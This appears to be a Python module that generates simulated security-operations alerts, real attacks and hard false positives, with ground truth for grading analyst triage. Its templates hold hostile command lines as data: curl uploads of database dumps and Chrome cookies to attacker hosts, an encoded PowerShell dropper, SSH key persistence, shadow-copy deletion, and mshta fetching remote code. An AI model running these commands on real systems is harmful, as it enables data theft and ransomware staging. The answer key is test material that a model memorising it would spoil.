"""Procedural SOC threat generator — the signal layer to app.py's noise layer.

`_CYBER_DAY_PACKS` hand-authors the real threats, which caps the simulation at
five days and replays the same incidents on a second run. This module produces
them instead: a kill-chain template is parameterised over the same entity pools
the noise generator uses, then rendered into the exact alert schema the SIEM,
the EDR console and the triage scorer already consume — process tree, network
and file events, raw syslog line, MITRE mapping, playbook, and the ground truth
(`is_real_threat` / `correct_action` / `points`) that makes triage gradeable.

Deterministic like the noise layer: same (day, seed) → byte-identical output,
so `_insert_day_pack`'s id check keeps re-entry idempotent.

No free text is generated. Every string is a template expansion, so alerts are
always convention-clean and never drift into LLM-shaped prose. The contract is
pinned by test_threat_alerts.py.
"""
from __future__ import annotations

import hashlib
import random
from datetime import datetime, timedelta
from typing import Any, Callable, Optional

SIM_EPOCH = datetime(2026, 2, 17)

# Fallback only: app.py passes its own `_NOISE_POOLS` so generated threats land
# on the same hosts and users that appear in the noise around them.
DEFAULT_POOLS: dict[str, list] = {
    "workstations": [("WS-FIN-011", "10.0.1.11"), ("WS-ENG-021", "10.0.5.21"),
                     ("WS-HR-05", "10.0.2.5"), ("WS-SALES-07", "10.0.3.7")],
    "servers": [("PROD-WEB-01", "10.0.6.10"), ("FILE-SRV-01", "10.0.7.21"),
                ("DC01", "10.0.0.10"), ("BACKUP-SRV-01", "10.0.8.11")],
    "users": ["d.okafor", "s.whitmore", "p.novak", "l.tran", "c.mbeki"],
}

# Hostile infrastructure: (ip, geo, reputation). Kept away from the RFC1918
# space the internal pools use so src/dst conventions always hold.
THREAT_INFRA: list[tuple[str, str, str]] = [
    ("185.234.72.19", "Bucharest, Romania", "Unregistered — no threat intel match"),
    ("193.142.60.18", "Sofia, Bulgaria", "Newly registered (3 days)"),
    ("45.129.14.207", "Amsterdam, Netherlands", "Bulletproof hosting — abuse reports"),
    ("91.219.236.88", "Riga, Latvia", "Known C2 infrastructure — AlienVault OTX"),
    ("103.75.190.24", "Ho Chi Minh City, Vietnam", "Compromised VPS — repeated scanning"),
    ("203.0.113.42", "Amsterdam, Netherlands", "Known Tor exit node"),
]

C2_DOMAINS = ["cdn-assets-sync.top", "update-checkpoint.xyz", "office-mfa-verify.info",
              "secure-docs-review.click", "telemetry-node7.live"]

WINDOWS_OS = "Windows 11 Enterprise"
WINDOWS_SERVER_OS = "Windows Server 2022"
LINUX_OS = "Ubuntu Server 22.04"

# Asset role read off the hostname, so copy never calls a mail gateway a file
# server. Longest prefix wins.
HOST_ROLES: list[tuple[str, str]] = [
    ("DC", "Domain controller"), ("FILE-SRV", "File server"),
    ("MAIL-GW", "Mail gateway"), ("PRINT-SRV", "Print server"),
    ("PROD-WEB", "Web server"), ("PROD-APP", "Application server"),
    ("STAGING-DB", "Database server"), ("BACKUP-SRV", "Backup server"),
    ("WS-", "User endpoint"),
]


def _sha(*parts: str) -> str:
    return hashlib.sha256("|".join(parts).encode()).hexdigest()


def _hhmm(rng: random.Random, lo: int, hi: int) -> str:
    return f"{rng.randint(lo, hi):02d}:{rng.randint(0, 59):02d}:{rng.randint(0, 59):02d}"


def _plus(ts: str, seconds: int) -> str:
    dt = datetime.strptime(ts, "%Y-%m-%dT%H:%M:%SZ") + timedelta(seconds=seconds)
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


# Host roles inferred from the naming convention, so a Linux incident never
# lands on a domain controller and PsExec never runs on a web server.
WINDOWS_SERVER_PREFIXES = ("DC", "FILE-SRV", "PRINT-SRV", "MAIL-GW", "SCCM", "EXCH")


def _hosts(pools: dict, host_kind: str) -> list:
    if host_kind == "workstation":
        return pools["workstations"]
    windows = [hp for hp in pools["servers"] if hp[0].startswith(WINDOWS_SERVER_PREFIXES)]
    if host_kind == "windows_server":
        return windows or pools["servers"]
    return [hp for hp in pools["servers"] if hp not in windows] or pools["servers"]


class _Ctx:
    """Everything a template needs to render one incident."""

    def __init__(self, rng: random.Random, day: int, pools: dict, host_kind: str) -> None:
        self.rng = rng
        self.day = day
        date = (SIM_EPOCH + timedelta(days=day))
        self.date = date.strftime("%Y-%m-%d")
        self.mon_day = date.strftime("%b %d")
        host, ip = rng.choice(_hosts(pools, host_kind))
        self.host, self.ip = host, ip
        self.user = rng.choice(pools["users"])
        self.c2_ip, self.c2_geo, self.c2_rep = rng.choice(THREAT_INFRA)
        self.c2_domain = rng.choice(C2_DOMAINS)
        self.os = (LINUX_OS if host_kind == "linux_server"
                   else WINDOWS_SERVER_OS if host_kind == "windows_server" else WINDOWS_OS)
        self.role = next((r for p, r in sorted(HOST_ROLES, key=lambda x: -len(x[0]))
                          if host.startswith(p)), "Server")
        self.pid = rng.randint(2000, 29000)

    @property
    def asset(self) -> str:
        return f"{self.role} ({self.host}, {self.os})"

    def ts(self, time_hhmmss: str) -> str:
        return f"{self.date}T{time_hhmmss}Z"

    def next_pid(self) -> int:
        self.pid += self.rng.randint(3, 90)
        return self.pid

    def proc(self, name: str, cmdline: str, user: str, ts: str, ppid: int,
             malicious: bool = True, signed: bool = True) -> dict:
        return {"pid": self.next_pid(), "ppid": ppid, "name": name, "cmdline": cmdline,
                "user": user, "start_ts": ts, "signed": signed,
                "hash": _sha(name, cmdline, self.host), "malicious": malicious}


# ──────────────────────────────────────────────────────────────────────
# Kill-chain templates
#
# Each returns the fields specific to the incident; `_render` supplies the
# schema-wide defaults. `difficulty` is how hard the incident is to spot in
# the noise: 1 screams, 3 looks like ordinary admin activity.
# ──────────────────────────────────────────────────────────────────────

def _t_exfiltration(c: _Ctx) -> dict:
    t0 = _hhmm(c.rng, 1, 4)
    ts0 = c.ts(t0)
    gb = c.rng.randint(4, 22)
    dump = f"/tmp/dump_{c.date.replace('-', '')}.tar.gz"
    root = c.proc("cron", "/usr/sbin/cron -f", "root", ts0, 1, malicious=False)
    sh = c.proc("bash", "/bin/bash /opt/backup/nightly.sh", c.user, _plus(ts0, 120), root["pid"])
    tar = c.proc("tar", f"tar czf {dump} /var/lib/postgresql/data", c.user, _plus(ts0, 300), sh["pid"])
    curl = c.proc("curl", f"curl -X POST https://{c.c2_ip}/upload -d @{dump}", c.user, _plus(ts0, 900), sh["pid"])
    return {
        "severity": "CRITICAL", "confidence": c.rng.randint(88, 96), "sla_hours": 1, "points": 20,
        "threat_type": "data_exfiltration", "difficulty": 1,
        "source": "EDR", "source_detail": "CrowdStrike Falcon",
        "title": "Large outbound data transfer to unregistered IP",
        "description": f"{gb}.{c.rng.randint(0, 9)} GB transferred via HTTPS to an external IP during non-business hours.",
        "details": f"Backup service account streamed a database dump to {c.c2_ip} outside the change window.",
        "mitre": ("Exfiltration", "T1048.001", "Exfiltration Over Alternative Protocol: HTTPS"),
        "affected_asset": c.asset,
        "playbook": "IR-EXFIL-001: Data Exfiltration Response",
        "playbook_steps": [
            f"Isolate {c.host} from the network immediately",
            "Capture memory dump and disk image before remediation",
            f"Check when {c.user} credentials were last rotated",
            f"Review firewall logs for {c.c2_ip} — any prior connections?",
            "Notify the CISO and open a P1 incident bridge",
            "Determine whether the dump contained PII — if so, start breach notification",
        ],
        "raw_log": (f"{c.mon_day} {t0} {c.host} crowdstrike[{curl['pid']}]: ALERT severity=critical "
                    f"src={c.ip} dst={c.c2_ip} proto=https bytes_out={gb * 1024 ** 3} user={c.user} "
                    f"process=/usr/bin/curl cmd=\"curl -X POST https://{c.c2_ip}/upload -d @{dump}\""),
        "process_tree": [root, sh, tar, curl],
        "network_events": [{"ts": _plus(ts0, 900), "src_ip": c.ip, "dst_ip": c.c2_ip,
                            "dst_port": 443, "direction": "outbound",
                            "bytes": gb * 1024 ** 3, "protocol": "HTTPS"}],
        "file_events": [{"ts": _plus(ts0, 300), "path": dump, "action": "create", "process": "tar"},
                        {"ts": _plus(ts0, 960), "path": dump, "action": "delete", "process": "bash"}],
        "_ts": ts0,
    }


def _t_phish_macro(c: _Ctx) -> dict:
    t0 = _hhmm(c.rng, 8, 11)
    ts0 = c.ts(t0)
    payload = f"C:\\Users\\{c.user}\\AppData\\Local\\Temp\\{c.rng.randrange(10 ** 5, 10 ** 6)}.dll"
    word = c.proc("WINWORD.EXE", "\"C:\\Program Files\\Microsoft Office\\WINWORD.EXE\" /n \"Invoice_Q1.docm\"",
                  c.user, ts0, 1, malicious=False)
    ps = c.proc("powershell.exe", "powershell.exe -NoP -W Hidden -EncodedCommand JABwAD0AbgBlAHcA...",
                c.user, _plus(ts0, 8), word["pid"])
    rundll = c.proc("rundll32.exe", f"rundll32.exe {payload},DllRegisterServer", c.user, _plus(ts0, 41), ps["pid"])
    return {
        "severity": "HIGH", "confidence": c.rng.randint(78, 90), "sla_hours": 2, "points": 15,
        "threat_type": "malware_dropper", "difficulty": 2,
        "source": "EDR", "source_detail": "CrowdStrike Falcon",
        "title": "Suspicious PowerShell with encoded payload",
        "description": f"Encoded PowerShell launched from a Word macro on {c.host}.",
        "details": f"WINWORD.EXE spawned powershell.exe with -EncodedCommand; the decoded payload fetches a DLL from {c.c2_domain}.",
        "mitre": ("Execution", "T1059.001", "Command and Scripting Interpreter: PowerShell"),
        "affected_asset": c.asset,
        "playbook": "IR-MAL-002: Macro-Initiated PowerShell",
        "playbook_steps": [
            f"Isolate {c.host}",
            "Pull email gateway logs for the delivered attachment",
            f"Check for lateral movement from {c.user}",
            "Add the payload hash to the blocklist and update YARA rules",
        ],
        "raw_log": (f"{c.mon_day} {t0} {c.host} powershell[{ps['pid']}]: ParentProcess=WINWORD.EXE "
                    f"User={c.user} Cmd=\"powershell.exe -NoP -W Hidden -EncodedCommand JABwAD0AbgBlAHcA...\""),
        "process_tree": [word, ps, rundll],
        "network_events": [{"ts": _plus(ts0, 30), "src_ip": c.ip, "dst_ip": c.c2_ip, "dst_port": 443,
                            "direction": "outbound", "bytes": 418_233, "protocol": "HTTPS"}],
        "file_events": [{"ts": _plus(ts0, 33), "path": payload, "action": "create", "process": "powershell.exe"}],
        "_ts": ts0,
    }


def _t_brute_force(c: _Ctx) -> dict:
    t0 = _hhmm(c.rng, 0, 5)
    ts0 = c.ts(t0)
    attempts = c.rng.randint(240, 1900)
    sshd = c.proc("sshd", "/usr/sbin/sshd -D", "root", ts0, 1, malicious=False)
    sess = c.proc("sshd", f"sshd: {c.user} [priv]", "root", _plus(ts0, 740), sshd["pid"])
    sh = c.proc("bash", "-bash", c.user, _plus(ts0, 748), sess["pid"])
    who = c.proc("whoami", "whoami", c.user, _plus(ts0, 769), sh["pid"])
    keys = c.proc("bash", f"bash -c 'echo ssh-ed25519 AAAAC3Nza... attacker@kali >> /home/{c.user}/.ssh/authorized_keys'",
                  c.user, _plus(ts0, 858), sh["pid"])
    return {
        "severity": "HIGH", "confidence": c.rng.randint(80, 92), "sla_hours": 2, "points": 15,
        "threat_type": "brute_force", "difficulty": 1,
        "source": "EDR", "source_detail": "CrowdStrike Falcon",
        "title": "SSH brute force followed by successful login",
        "description": f"{attempts} failed SSH attempts in 12 minutes, then a successful login — account likely compromised.",
        "details": f"Password spray against {c.host} from {c.c2_ip}, followed by key persistence in authorized_keys.",
        "mitre": ("Credential Access", "T1110.001", "Brute Force: Password Guessing"),
        "affected_asset": c.asset,
        "playbook": "IR-CRED-002: Brute Force / Account Compromise",
        "playbook_steps": [
            f"Disable the {c.user} account immediately and force a password reset",
            f"Block {c.c2_ip} at the perimeter firewall",
            f"Remove unauthorised keys from /home/{c.user}/.ssh/authorized_keys",
            f"Review the last 24h of authentication logs for lateral movement from {c.host}",
        ],
        "raw_log": (f"{c.mon_day} {t0} {c.host} sshd[{sess['pid']}]: Failed password for {c.user} from "
                    f"{c.c2_ip} port {c.rng.randint(40000, 60000)} ssh2 ({attempts} attempts in window) — "
                    f"followed by Accepted password for {c.user} from {c.c2_ip}"),
        "process_tree": [sshd, sess, sh, who, keys],
        "network_events": [{"ts": _plus(ts0, i * 210), "src_ip": c.c2_ip, "dst_ip": c.ip, "dst_port": 22,
                            "direction": "inbound", "bytes": 1900 + i * 140, "protocol": "SSH"}
                           for i in range(4)],
        "file_events": [{"ts": _plus(ts0, 858), "path": f"/home/{c.user}/.ssh/authorized_keys",
                         "action": "modify", "process": "bash"}],
        "_ts": ts0,
        "_external_source": True,
    }


def _t_ransomware_stage(c: _Ctx) -> dict:
    t0 = _hhmm(c.rng, 2, 6)
    ts0 = c.ts(t0)
    svc = c.proc("services.exe", "C:\\Windows\\system32\\services.exe", "SYSTEM", ts0, 1, malicious=False)
    psexec = c.proc("PSEXESVC.exe", "C:\\Windows\\PSEXESVC.exe", "SYSTEM", _plus(ts0, 12), svc["pid"])
    vss = c.proc("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "SYSTEM", _plus(ts0, 61), psexec["pid"])
    bcd = c.proc("bcdedit.exe", "bcdedit /set {default} recoveryenabled No", "SYSTEM", _plus(ts0, 78), psexec["pid"])
    return {
        "severity": "CRITICAL", "confidence": c.rng.randint(90, 98), "sla_hours": 1, "points": 20,
        "threat_type": "ransomware_prep", "difficulty": 1,
        "source": "EDR", "source_detail": "CrowdStrike Falcon",
        "title": "Shadow copy deletion and recovery disabled",
        "description": f"vssadmin deleted all shadow copies on {c.host} and boot recovery was disabled — classic pre-encryption staging.",
        "details": f"Remote service execution (PsExec) preceded the destruction of restore points on {c.role.lower()} {c.host}.",
        "mitre": ("Impact", "T1490", "Inhibit System Recovery"),
        "affected_asset": c.asset,
        "playbook": "IR-RANSOM-001: Pre-Encryption Staging",
        "playbook_steps": [
            f"Isolate {c.host} now — encryption typically follows within minutes",
            "Verify offline backups exist and are not reachable from the domain",
            "Identify the source host of the PsExec session and isolate it too",
            "Escalate to a P1 bridge and notify the CISO",
        ],
        "raw_log": (f"{c.mon_day} {t0} {c.host} Microsoft-Windows-Security-Auditing[4688]: "
                    f"New Process Name: vssadmin.exe CommandLine=\"vssadmin.exe delete shadows /all /quiet\" "
                    f"ParentProcessName=PSEXESVC.exe Account=SYSTEM"),
        "process_tree": [svc, psexec, vss, bcd],
        "network_events": [{"ts": _plus(ts0, 5), "src_ip": c.c2_ip, "dst_ip": c.ip, "dst_port": 445,
                            "direction": "inbound", "bytes": 91_204, "protocol": "SMB"}],
        "file_events": [{"ts": _plus(ts0, 61), "path": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1",
                         "action": "delete", "process": "vssadmin.exe"}],
        "_ts": ts0,
    }


def _t_token_theft(c: _Ctx) -> dict:
    t0 = _hhmm(c.rng, 6, 20)
    ts0 = c.ts(t0)
    browser = c.proc("chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
                     c.user, ts0, 1, malicious=False)
    grab = c.proc("powershell.exe",
                  "powershell.exe -c \"Copy-Item $env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies $env:TEMP\\c.db\"",
                  c.user, _plus(ts0, 96), browser["pid"])
    post = c.proc("curl.exe", f"curl.exe -F file=@%TEMP%\\c.db https://{c.c2_domain}/u", c.user, _plus(ts0, 143), grab["pid"])
    return {
        "severity": "HIGH", "confidence": c.rng.randint(70, 84), "sla_hours": 3, "points": 15,
        "threat_type": "credential_theft", "difficulty": 3,
        "source": "EDR", "source_detail": "CrowdStrike Falcon",
        "title": "Browser cookie store copied and uploaded",
        "description": f"Session cookie database on {c.host} was copied to temp and posted to {c.c2_domain}.",
        "details": "Session-token theft bypasses MFA: the stolen cookies replay as an authenticated session.",
        "mitre": ("Credential Access", "T1539", "Steal Web Session Cookie"),
        "affected_asset": c.asset,
        "playbook": "IR-CRED-004: Session Token Theft",
        "playbook_steps": [
            f"Revoke all active sessions for {c.user} in the IdP — a password reset alone will not help",
            "Check IdP sign-in logs for replays from unfamiliar IPs or user agents",
            f"Isolate {c.host} and scan for the infostealer that dropped this",
            f"Block {c.c2_domain} at the proxy",
        ],
        "raw_log": (f"{c.mon_day} {t0} {c.host} crowdstrike[{post['pid']}]: FileAccess "
                    f"path=\"Chrome\\User Data\\Default\\Cookies\" by=powershell.exe user={c.user} "
                    f"followed_by upload dst={c.c2_domain} ({c.c2_ip})"),
        "process_tree": [browser, grab, post],
        "network_events": [{"ts": _plus(ts0, 143), "src_ip": c.ip, "dst_ip": c.c2_ip, "dst_port": 443,
                            "direction": "outbound", "bytes": 291_004, "protocol": "HTTPS"}],
        "file_events": [{"ts": _plus(ts0, 96), "path": "C:\\Users\\%USER%\\AppData\\Local\\Temp\\c.db".replace("%USER%", c.user),
                         "action": "create", "process": "powershell.exe"}],
        "_ts": ts0,
    }


def _t_dns_beacon(c: _Ctx) -> dict:
    t0 = _hhmm(c.rng, 0, 23)
    ts0 = c.ts(t0)
    host_proc = c.proc("svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs", "SYSTEM", ts0, 1, malicious=False)
    beacon = c.proc("mshta.exe", f"mshta.exe https://{c.c2_domain}/a.hta", c.user, _plus(ts0, 30), host_proc["pid"])
    return {
        "severity": "MEDIUM", "confidence": c.rng.randint(58, 74), "sla_hours": 4, "points": 12,
        "threat_type": "c2_beacon", "difficulty": 3,
        "source": "Network Monitor", "source_detail": "Zeek",
        "title": "Periodic DNS requests to a newly registered domain",
        "description": f"{c.host} queried {c.c2_domain} every 300s (±2s jitter) for six hours.",
        "details": "Fixed-interval callbacks with near-zero jitter are machine-driven, not user browsing.",
        "mitre": ("Command and Control", "T1071.004", "Application Layer Protocol: DNS"),
        "affected_asset": c.asset,
        "playbook": "IR-C2-003: Suspected Beacon",
        "playbook_steps": [
            f"Sinkhole {c.c2_domain} and capture further callbacks",
            f"Pull the process that owns the DNS socket on {c.host}",
            "Check whether other hosts query the same domain — spread indicates a campaign",
            "Escalate to incident response if a parent process cannot be justified",
        ],
        "raw_log": (f"{c.mon_day} {t0} zeek dns: {c.ip} -> 10.0.0.10 query={c.c2_domain} "
                    f"qtype=A answers={c.c2_ip} interval_mean=300.4s jitter=1.8s count=72"),
        "process_tree": [host_proc, beacon],
        "network_events": [{"ts": _plus(ts0, i * 300), "src_ip": c.ip, "dst_ip": c.c2_ip, "dst_port": 53,
                            "direction": "outbound", "bytes": 148 + i, "protocol": "DNS"} for i in range(6)],
        "file_events": [],
        "_ts": ts0,
    }


# ── Hard false positives: shaped like a threat, benign once you check ──

def _fp_pentest(c: _Ctx) -> dict:
    t0 = _hhmm(c.rng, 9, 16)
    ts0 = c.ts(t0)
    shell = c.proc("bash", "/bin/bash /home/pentest/run-scope-scan.sh", "pentest", ts0, 1, malicious=False)
    scan = c.proc("nmap", f"nmap -sS -p- {c.ip}/24", "pentest", _plus(ts0, 6), shell["pid"], malicious=False)
    return {
        "severity": "HIGH", "confidence": c.rng.randint(60, 75), "sla_hours": 4, "points": 12,
        "threat_type": "authorised_testing", "difficulty": 2, "real": False,
        "source": "IDS", "source_detail": "Suricata",
        "title": "Full port scan against the server subnet",
        "description": f"Aggressive SYN scan of the {c.ip.rsplit('.', 1)[0]}.0/24 range from an internal host.",
        "details": ("Source is PENTEST-VM-01, the authorised testing host. Change CHG-4471 covers this "
                    "window and the scanning account is 'pentest'."),
        "mitre": ("Discovery", "T1046", "Network Service Discovery"),
        "affected_asset": f"Server subnet ({c.ip.rsplit('.', 1)[0]}.0/24)",
        "playbook": "IR-SCAN-001: Internal Scanning Activity",
        "playbook_steps": [
            "Confirm the source host against the authorised testing inventory",
            "Match the window against the approved change record",
            "Close as a false positive with the change reference in the rationale",
        ],
        "raw_log": (f"{c.mon_day} {t0} suricata[2211]: [1:2010935:3] SCAN nmap SYN scan "
                    f"src=10.0.9.40 (PENTEST-VM-01) dst={c.ip} change=CHG-4471 account=pentest"),
        "fp_indicators": ("Source is the authorised pentest host; change CHG-4471 approves this window; "
                          "the scanning account is a testing service account, not a user."),
        "process_tree": [shell, scan],
        "network_events": [{"ts": _plus(ts0, i * 4), "src_ip": "10.0.9.40", "dst_ip": c.ip,
                            "dst_port": 22 + i * 100, "direction": "inbound", "bytes": 60, "protocol": "TCP"}
                           for i in range(5)],
        "file_events": [],
        "_ts": ts0,
        "_src_override": ("10.0.9.40", "PENTEST-VM-01", "pentest"),
    }


def _fp_ci_deploy(c: _Ctx) -> dict:
    t0 = _hhmm(c.rng, 1, 5)
    ts0 = c.ts(t0)
    agent = c.proc("bash", "/bin/bash /opt/ci/agent-run.sh", "ci-runner", ts0, 1, malicious=False)
    push = c.proc("rsync", f"rsync -az /var/builds/ deploy@{c.c2_ip.rsplit('.', 1)[0]}.10:/srv/releases/",
                  "ci-runner", _plus(ts0, 45), agent["pid"], malicious=False)
    return {
        "severity": "MEDIUM", "confidence": c.rng.randint(45, 62), "sla_hours": 8, "points": 10,
        "threat_type": "scheduled_deployment", "difficulty": 3, "real": False,
        "source": "EDR", "source_detail": "CrowdStrike Falcon",
        "title": "Bulk outbound transfer outside business hours",
        "description": f"{c.rng.randint(2, 9)} GB pushed from {c.host} at {t0.rsplit(':', 1)[0]} by the CI runner.",
        "details": ("Transfer is the nightly release sync to the CDN origin. Destination is in the deployment "
                    "allow-list and the account is the CI service account."),
        "mitre": ("Exfiltration", "T1048", "Exfiltration Over Alternative Protocol"),
        "affected_asset": c.asset,
        "playbook": "IR-EXFIL-001: Data Exfiltration Response",
        "playbook_steps": [
            "Resolve the destination and check it against the deployment allow-list",
            "Confirm the initiating account is a service account with a matching schedule",
            "Close as a false positive and note the pipeline that owns the job",
        ],
        "raw_log": (f"{c.mon_day} {t0} {c.host} crowdstrike[{push['pid']}]: bulk_transfer src={c.ip} "
                    f"dst=cdn-origin.internal proto=rsync user=ci-runner job=nightly-release schedule=0 2 * * *"),
        "fp_indicators": ("Destination is the CDN origin in the deployment allow-list; the account is the CI "
                          "service account; the transfer matches the nightly cron schedule exactly."),
        "process_tree": [agent, push],
        "network_events": [{"ts": _plus(ts0, 45), "src_ip": c.ip, "dst_ip": "10.0.6.10", "dst_port": 873,
                            "direction": "outbound", "bytes": 3_221_225_472, "protocol": "RSYNC"}],
        "file_events": [],
        "_ts": ts0,
        "_src_override": (c.ip, c.host, "ci-runner"),
    }


def _fp_admin_psexec(c: _Ctx) -> dict:
    t0 = _hhmm(c.rng, 18, 22)
    ts0 = c.ts(t0)
    svc = c.proc("services.exe", "C:\\Windows\\system32\\services.exe", "SYSTEM", ts0, 1, malicious=False)
    px = c.proc("PSEXESVC.exe", "C:\\Windows\\PSEXESVC.exe", "SYSTEM", _plus(ts0, 9), svc["pid"], malicious=False)
    patch = c.proc("wusa.exe", "wusa.exe C:\\patches\\windows10.0-kb5034763.msu /quiet /norestart",
                   "SYSTEM", _plus(ts0, 30), px["pid"], malicious=False)
    return {
        "severity": "MEDIUM", "confidence": c.rng.randint(50, 66), "sla_hours": 8, "points": 10,
        "threat_type": "authorised_admin", "difficulty": 3, "real": False,
        "source": "EDR", "source_detail": "CrowdStrike Falcon",
        "title": "Remote service execution on a server",
        "description": f"PsExec service installed on {c.host} and used to run an installer as SYSTEM.",
        "details": ("Patch window CHG-4488 runs 18:00–23:00 tonight; the installer is the signed February "
                    "cumulative update and the initiating host is the SCCM management server."),
        "mitre": ("Execution", "T1569.002", "System Services: Service Execution"),
        "affected_asset": c.asset,
        "playbook": "IR-ADMIN-002: Remote Execution Review",
        "playbook_steps": [
            "Identify the initiating host and whether it is a management server",
            "Check the executed binary's signature and KB reference",
            "Match against the open change record before closing",
        ],
        "raw_log": (f"{c.mon_day} {t0} {c.host} Microsoft-Windows-Security-Auditing[4697]: "
                    f"Service installed Name=PSEXESVC Account=SYSTEM Source=SCCM-MGMT-01 change=CHG-4488"),
        "fp_indicators": ("Initiating host is the SCCM management server; the payload is a signed Microsoft "
                          "cumulative update; change CHG-4488 covers the window."),
        "process_tree": [svc, px, patch],
        "network_events": [{"ts": _plus(ts0, 3), "src_ip": "10.0.0.24", "dst_ip": c.ip, "dst_port": 445,
                            "direction": "inbound", "bytes": 74_118, "protocol": "SMB"}],
        "file_events": [{"ts": _plus(ts0, 20), "path": "C:\\patches\\windows10.0-kb5034763.msu",
                         "action": "create", "process": "PSEXESVC.exe"}],
        "_ts": ts0,
        "_src_override": ("10.0.0.24", "SCCM-MGMT-01", "svc_sccm"),
    }


# (template, host_kind, difficulty) — difficulty is declared here as well as in
# the spec so eligibility can be filtered without rendering first.
Template = tuple[Callable[["_Ctx"], dict], str, int]

THREAT_TEMPLATES: list[Template] = [
    (_t_exfiltration, "linux_server", 1),
    (_t_phish_macro, "workstation", 2),
    (_t_brute_force, "linux_server", 1),
    (_t_ransomware_stage, "windows_server", 1),
    (_t_token_theft, "workstation", 3),
    (_t_dns_beacon, "workstation", 3),
]

FP_TEMPLATES: list[Template] = [
    (_fp_pentest, "linux_server", 2),
    (_fp_ci_deploy, "linux_server", 3),
    (_fp_admin_psexec, "windows_server", 3),
]


def _render(spec: dict, c: _Ctx, alert_id: str) -> dict:
    """Turn a template's output into the alert schema app.py consumes."""
    real = spec.get("real", True)
    tactic, technique, tech_name = spec["mitre"]
    if spec.get("_external_source"):
        src_ip, src_host, src_user = c.c2_ip, f"(external — {c.c2_geo})", c.user
        dst_ip, dst_geo, dst_rep = c.ip, "Internal", c.c2_rep
    elif spec.get("_src_override"):
        src_ip, src_host, src_user = spec["_src_override"]
        dst_ip, dst_geo, dst_rep = c.ip, "Internal", "Internal address — reputation N/A"
    else:
        src_ip, src_host, src_user = c.ip, c.host, c.user
        dst_ip, dst_geo, dst_rep = c.c2_ip, c.c2_geo, c.c2_rep

    tree = spec["process_tree"]
    alert = {
        "id": alert_id,
        "timestamp": spec["_ts"],
        "severity": spec["severity"],
        "confidence": spec["confidence"],
        "source": spec["source"],
        "source_detail": spec["source_detail"],
        "title": spec["title"],
        "description": spec["description"],
        "details": spec["details"],
        "src_ip": src_ip, "src_host": src_host, "src_user": src_user,
        "dst_ip": dst_ip, "dst_geo": dst_geo, "dst_reputation": dst_rep,
        "affected_asset": spec["affected_asset"],
        "mitre_tactic": tactic, "mitre_technique": technique, "mitre_name": tech_name,
        "status": "open", "triage_status": "unreviewed",
        "sla_hours": spec["sla_hours"],
        "is_real_threat": real,
        "threat_type": spec["threat_type"],
        "correct_action": "escalate" if real else "resolve",
        "points": spec["points"],
        "related_alerts": [],
        "playbook": spec["playbook"],
        "playbook_steps": spec["playbook_steps"],
        "raw_log": spec["raw_log"],
        "analyst_notes": "",
        "false_positive_indicators": spec.get("fp_indicators"),
        "difficulty": spec["difficulty"],
        "generated": True,
    }
    if tree:
        alert["edr_telemetry"] = {
            "sensor": spec["source_detail"] if spec["source"] == "EDR" else "CrowdStrike Falcon",
            "os": c.os,
            "host_status": "active",
            "collected_at": _plus(spec["_ts"], 420),
            "process_tree": tree,
            "network_events": spec["network_events"],
            "file_events": spec["file_events"],
        }
    return alert


def threat_seed(sim: str, day: int) -> int:
    """Per (simulation, day), and distinct from the noise seed for the same
    pair so threats and noise do not draw correlated choices."""
    return int(hashlib.md5(f"threat:{sim}:{day}".encode()).hexdigest(), 16) % (2 ** 32)


def _difficulty_ceiling(day: int) -> int:
    """Obvious incidents first; subtler ones once the analyst has the basics.
    Day 1-2 only difficulty 1-2, day 3-4 up to 2-3, day 5+ anything."""
    return 2 if day <= 2 else 3


def generate_day_threats(day: int, seed: int, pools: Optional[dict] = None,
                         threats: Optional[int] = None,
                         false_positives: Optional[int] = None) -> list[dict]:
    """Real threats plus hard false positives for one simulation day.

    Deterministic: same (day, seed) → byte-identical output. Pure — no Mongo,
    no sim_id; `_insert_day_pack` stamps simulation_id and day.
    """
    pools = pools or DEFAULT_POOLS
    rng = random.Random(seed)
    ceiling = _difficulty_ceiling(day)
    n_real = threats if threats is not None else rng.choice([2, 2, 3])
    n_fp = false_positives if false_positives is not None else rng.choice([1, 1, 2])

    def build(templates: list[Template], n: int, kind: str, offset: int) -> list[dict]:
        eligible = [t for t in templates if t[2] <= ceiling] or templates
        picked = rng.sample(eligible, k=min(n, len(eligible)))
        out = []
        for i, (fn, host_kind, _diff) in enumerate(picked):
            # One context per incident: the template draws its entities from it
            # and _render reads the same ones back.
            ctx = _Ctx(rng, day, pools, host_kind)
            # The numeric tail becomes the analyst-facing SOC-2026-XXXX id, so
            # it carries the day and an offset that clears the noise range.
            seq = day * 1000 + offset + i + 1
            out.append(_render(fn(ctx), ctx, f"{kind}-2026-D{day}-{seq:04d}"))
        return out

    alerts = build(THREAT_TEMPLATES, n_real, "THREAT", 0) + build(FP_TEMPLATES, n_fp, "HARDFP", 500)
    alerts.sort(key=lambda a: a["timestamp"])
    return alerts


def summarise(alerts: list[dict]) -> dict[str, Any]:
    """Ground-truth summary for logging and grading — never sent to the client."""
    return {
        "count": len(alerts),
        "real": sum(1 for a in alerts if a["is_real_threat"]),
        "false_positives": sum(1 for a in alerts if not a["is_real_threat"]),
        "types": sorted({a["threat_type"] for a in alerts}),
    }
